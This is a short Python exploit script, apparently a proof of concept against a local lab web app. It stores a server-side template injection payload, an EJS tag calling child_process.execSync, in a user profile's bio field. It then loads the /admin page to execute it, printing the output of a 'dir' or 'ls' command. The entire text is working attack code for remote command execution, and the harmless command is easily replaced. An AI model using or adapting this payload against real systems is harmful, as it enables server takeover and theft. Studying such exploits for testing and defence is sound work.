import http.client
import json
import platform

cmd = "dir" if platform.system().lower().startswith("win") else "ls"
payload = f"<%= require('child_process').execSync('{cmd}').toString() %>"

print("[*] Setting SSTI payload in bio...")
conn2 = http.client.HTTPConnection("localhost", 3000)
bio_payload = {"bio": payload}
conn2.request("POST", "/update-profile",
              json.dumps(bio_payload),
              {"Content-Type": "application/json"})
resp2 = conn2.getresponse()
print(f"   Set bio status: {resp2.status}")
resp2.read() 
conn2.close()

print("[*] Triggering SSTI on /admin...")
conn3 = http.client.HTTPConnection("localhost", 3000)
conn3.request("GET", "/admin")
resp3 = conn3.getresponse()
print(f"   Admin page status: {resp3.status}")
print("[*] Response body (look for command output):")
print(resp3.read().decode())
conn3.close()